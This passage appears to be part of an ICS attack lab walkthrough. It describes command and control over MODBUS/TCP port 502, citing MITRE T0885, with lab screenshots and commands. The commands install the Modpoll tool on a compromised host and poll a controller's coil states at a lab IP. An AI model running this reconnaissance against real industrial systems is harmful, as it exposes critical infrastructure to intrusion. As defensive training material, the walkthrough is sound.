# Command and Control

#### **Blending in with Normal Network Activity Using MODBUS/TCP (Port 502)**

The attacker uses a commonly used port (MODBUS/TCP:502) to bypass firewalls and detection systems, blending in with normal network activity. (MODBUS or HTTP(S), OPC, RDP, telnet,...) \[T0885 - <https://attack.mitre.org/techniques/T0885/> ]

The attacker uses the **MODBUS/TCP** protocol, which typically operates on port **502**, to establish Command and Control between the compromised machines. By utilizing this widely-used industrial protocol, the attacker avoids raising suspicion, as MODBUS traffic is considered normal within many industrial control system (ICS) environments.


****![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXe68s9l88LiLzW58oAIbExkM1PYLvscOAAqFAvHHp6tOLt51MaLQ8FPIz7tMdvKEHOW4l0nL_VB9IUBwj8AA8V_T4d31CiCoXBRMqdYOjUH6Dbb-vHvfuF0mTgx-oDDinR1c7jWYZGhh5tQT27915pN327E?key=ZVE4yllmhIbKOidz4k1V_g)****

**Img 12:** Network scanning in M2, discovery of M3 network and 502 MODBUS TCP port.

1. **Installing Modpoll on Machine M2 (Attack Machine):**

- The attacker installs the **Modpoll** tool on the compromised M2 to interact with MODBUS devices in the network.

- Modpoll is a command-line tool for polling MODBUS data, allowing the attacker to **read and write** data from MODBUS registers on the target machines.

```
# step 1 install modpoll in M2

wget https://www.modbusdriver.com/downloads/modpoll.tgz

tar xzf modpoll.tgz

export PATH=modpoll/x86_64-linux-gnu:$PATH

```

2. **MODBUS Polling on M3 (System Controller) via MODBUS/TCP:**

- The attacker executes **Modpoll** to query the state of the system controllers on machine M3 using the MODBUS protocol over TCP (Port 502):

```
# step 1 checking machine/system controller states
# response can take some minutes
modpoll -m tcp -r 1 -c 4 -t 0 192.168.52.6 # the -c is the number of outputs you want to get, the response of this command can take some seconds to appear

```


![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdulCra-JfynzhNl3cQL84b5hF-KSM-R9Rpvw0YXXjbZuVnY0Np9DSqu0n3gC8_t2p-sqYn3tMN04iHupeVMoOjh9XNQGdUbqBrcqd6oQCJJQwKG3jJoZF3lP5YbpphLmiewSJlu9VdX0I4iT-2GBEla9-x?key=ZVE4yllmhIbKOidz4k1V_g)

**Img 13:** Response of MODBUS TCP port, controller states of systems in M3.

3. **Comparing Data with HMI Systems (ScadaBR and OpenPLC):**

- From the web interfaces of **ScadaBR** (http\://10.208.89.15:9090/ScadaBR/) and **OpenPLC** (http\://10.208.89.15:8080/monitoring), the attacker can see that they have the same information that authorized users would have about the machines' statuses.

- The attacker essentially mirrors what operators would see on their HMI (Human-Machine Interface), giving them full visibility into the operational state of the industrial control systems.

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXeLC8bPw3IoFnITDBK4Sn8iGF9yl1hOpoJymoFGglkc9cOz4h-MVLNfP4t2ucEE9GGSbH46LVc05i-2Jg_pMnI5B2Ud9WWvf1HRrbDj1ikRuQNAi8laqj1C9LUqMEDugh_zdkr_mUZtkWKhbYp5slwMt1g?key=ZVE4yllmhIbKOidz4k1V_g)

**Img 14:** OpenPLC (right) and ScadaBR HMI (left).
